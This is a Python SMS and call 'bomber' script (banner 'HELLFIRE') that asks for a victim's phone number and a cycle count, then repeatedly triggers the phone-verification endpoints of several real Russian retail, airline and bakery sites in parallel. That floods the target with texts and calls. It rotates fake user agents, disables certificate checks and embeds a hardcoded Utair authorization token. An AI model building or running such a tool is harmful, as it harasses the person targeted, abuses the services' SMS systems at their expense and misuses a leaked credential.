#!/home/arch/sms-tester/venv/bin/python
import requests
import time
import random
import urllib3
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ua = UserAgent()

def formate_letu(phone):
    if len(phone) == 11:
        return f"+7 ({phone[1:4]}) {phone[4:7]}-{phone[7:9]}-{phone[9:]}"
    return phone

APIS = [
    {
        "name": "Letu (L'Occitane)", 
        "url": "https://www.letu.ru/s/api/user/account/v1/confirmations/phone",
        "pre_url": "https://www.letu.ru/",
        "payload": {"phoneNumber": "{phone_mask}"}, "formate": False,
        "origin": "https://www.letu.ru", "referer": "https://www.letu.ru/",
        "params": {"pushSite": "storeMobileRU"}
    },
    {
        "name": "Utair (Mobile API)", 
        "url": "https://www.utair.ru/mobile/api/v8/user/login",
        "pre_url": "https://www.utair.ru/",
        "payload": {"login": "{phone}", "confirmationType": "callCode"}, "formate": False,
        "origin": "https://www.utair.ru", "referer": "https://www.utair.ru/",
        "headers": {"Authorization": "Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1NjkzIiwic2NvcGVzIjpbInVzZXIucHJvZmlsZSIsInVzZXIucHJvZmlsZS5lZGl0IiwidXNlci5wcm9maWxlLnJlcmVnaXN0cmF0aW9uIiwidXNlci5ib251cyIsInVzZXIucGF5bWVudHMuY2FyZHMiLCJ1c2VyLnJlZmVycmFscyIsInVzZXIuc3lzdGVtLmZlZWRiYWNrIiwidXNlci5jb21wYW55IiwidXNlci5leHBlcmltZW50YWwucnpkIiwiYXBwLnVzZXIucmVnaXN0cmF0aW9uIiwiYXBwLmJvbnVzIiwiYXBwLmJvb2tpbmciLCJhcHAuY2hlY2tpbiIsImFwcC5haXJwb3J0cyIsImFwcC5jb3VudHJpZXMiLCJhcHAudG91cnMiLCJhcHAucHJvbW8iLCJhcHAuc2NoZWR1bGUiLCJhcHAucHJvbW8ucHJlcGFpZCIsImFwcC5zeXN0ZW0uZmVlZGJhY2siLCJhcHAuc3lzdGVtLnRyYW5zYWN0aW9ucyIsImFwcC5zeXN0ZW0ucHJvZmlsZSIsImFwcC5zeXN0ZW0udGVzdC5hY2NvdW50cyIsImFwcC5zeXN0ZW0ubGlua3MiLCJhcHAuc3lzdGVtLm5vdGlmaWNhdGlvbiIsImFwcC5kYWRhdGEiLCJhcHAuYWIiLCJhcHAuY29tcGFueSIsImFwcC5zZXJ2aWNlcyJdLCJleHAiOjE2NDExODIzNDh9.crO5rLAZ1btPDgplxCVPjx9NtO_nHB7I83Gyf1QYeGE"}
    },
    {
        "name": "TortoMaster (SMS)", 
        "url": "https://kaliningrad.tortomaster.ru/include/ajax/flashcall_helper.php",
        "pre_url": "https://kaliningrad.tortomaster.ru/personal/?register=yes",
        "payload": {"REGISTER[PHONE_NUMBER]": "{phone}", "send_sms": "Y", "agree": "Y"}, "formate": True,
        "origin": "https://kaliningrad.tortomaster.ru", "referer": "https://kaliningrad.tortomaster.ru/personal/?register=yes"
    },
    {
        "name": "VTK-Moscow", 
        "url": "https://vtk-moscow.ru/users/",
        "pre_url": "https://vtk-moscow.ru/",
        "payload": {"from_phone": "{phone}", "apply": "reg_apply"}, "formate": True,
        "origin": "https://vtk-moscow.ru", "referer": "https://vtk-moscow.ru/"
    },
    {
        "name": "TortoMaster (Call)", 
        "url": "https://kaliningrad.tortomaster.ru/include/ajax/flashcall_helper.php",
        "pre_url": "https://kaliningrad.tortomaster.ru/personal/?register=yes",
        "payload": {"REGISTER[PHONE_NUMBER]": "{phone}", "send_sms": "N", "agree": "Y"}, "formate": True,
        "origin": "https://kaliningrad.tortomaster.ru", "referer": "https://kaliningrad.tortomaster.ru/personal/?register=yes"
    }
]

def send_request(api, phone):
    try:
        session = requests.Session()
        headers = {
            "User-Agent": ua.random,
            "Accept": "application/json, text/plain, */*",
            "Origin": api.get("origin", ""),
            "Referer": api.get("referer", "")
        }
        if "headers" in api:
            headers.update(api["headers"])
            
        session.headers.update(headers)

        if api.get("pre_url"):
            session.get(api["pre_url"], timeout=10, verify=False)

        payload = {}
        for k, v in api["payload"].items():
            if isinstance(v, str):
                payload[k] = v.replace("{phone}", phone).replace("{phone_mask}", formate_letu(phone))
            else:
                payload[k] = v

        if api.get("formate"):
            r = session.post(api["url"], data=payload, params=api.get("params"), timeout=10, verify=False)
        else:
            r = session.post(api["url"], json=payload, params=api.get("params"), timeout=10, verify=False)

        if r.status_code in [200, 201, 202, 204]:
            print(f"  [+] OK: {api['name']} ({r.status_code})")
        else:
            print(f"  [-] FAIL: {api['name']} ({r.status_code})")
            
    except Exception as e:
        print(f"  [!] ERR: {api['name']} - {type(e).__name__}")

def run_mode(mode, phone, cycles):
    if mode == "1":
        target_apis = [a for a in APIS if "Call" not in a["name"]]
    elif mode == "2":
        target_apis = [a for a in APIS if "Call" in a["name"]]
    else:
        target_apis = APIS

    print(f"\n[*] Starting mode {mode} for {phone}")
    print(f"[*] Cycles: {cycles}. Total APIs: {len(target_apis)}\n")

    for i in range(cycles):
        print(f"--- Cycle {i+1} ---")
        with ThreadPoolExecutor(max_workers=len(target_apis)) as executor:
            for api in target_apis:
                executor.submit(send_request, api, phone)
        time.sleep(3)

def main():
    ascii_art = """
    ██╗  ██╗███████╗██╗     ██╗     ███████╗██╗██████╗ ███████╗
    ██║  ██║██╔════╝██║     ██║     ██╔════╝██║██╔══██╗██╔════╝
    ███████║█████╗  ██║     ██║     █████╗  ██║██████╔╝█████╗  
    ██╔══██║██╔══╝  ██║     ██║     ██╔══╝  ██║██╔══██╗██╔══╝  
    ██║  ██║███████╗███████╗███████╗██║     ██║██║  ██║███████╗
    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
    """
    print(ascii_art)
    mode = input("Select mode (1: SMS, 2: CALL, 3: ALL) > ")
    phone = input("Enter phone (example: 79991234567): ").strip()
    phone = "".join(filter(str.isdigit, phone))
    cycles = int(input("Enter cycles: "))

    try:
        run_mode(mode, phone, cycles)
    except KeyboardInterrupt:
        print("\n[*] Stopped.")

if __name__ == "__main__":
    main()
